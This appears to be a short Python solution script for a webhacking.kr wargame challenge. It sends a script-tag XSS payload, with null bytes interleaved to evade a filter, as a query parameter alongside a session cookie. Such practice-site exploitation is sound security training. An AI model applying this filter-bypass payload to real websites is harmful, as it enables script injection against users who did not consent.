
import requests
import string
URL = "https://webhacking.kr/challenge/bonus-3/index.php"
SESSION_ID = "123"
cookies = {'PHPSESSID':SESSION_ID}
params = {'code':''}

    
intial_payload = "<script>alert(1);</script>"
payload = ''
for c in intial_payload:
    payload += c + '\0'

params['code'] = payload
response = requests.get(URL, params=params, cookies=cookies)
print(response.text)

    